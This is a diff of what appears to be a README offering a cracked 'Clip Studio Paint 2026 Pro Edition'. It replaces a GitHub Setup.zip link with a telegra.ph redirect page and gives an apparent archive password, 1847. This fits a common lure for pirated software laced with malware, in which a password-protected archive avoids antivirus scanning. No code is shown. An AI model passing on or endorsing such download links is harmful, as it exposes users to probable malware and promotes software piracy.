@@ -12,7 +12,7 @@ Clip Studio Paint 2026 Pro Edition. Drawing and painting software for comics, ma
 ***************** DOWNLOAD *****************
 ------------------------------------------------
 
-[+] DOWNLOAD LINK: [download here](https://github.com/BrinkLayerSignify/ClipStudio-Paint-Pro/releases/download/LaST/Setup.zip)
+[+] DOWNLOAD LINK: [download here](https://telegra.ph/Download-05-21-39)
 
 [+] 🔐🔐🔐: 1847
 
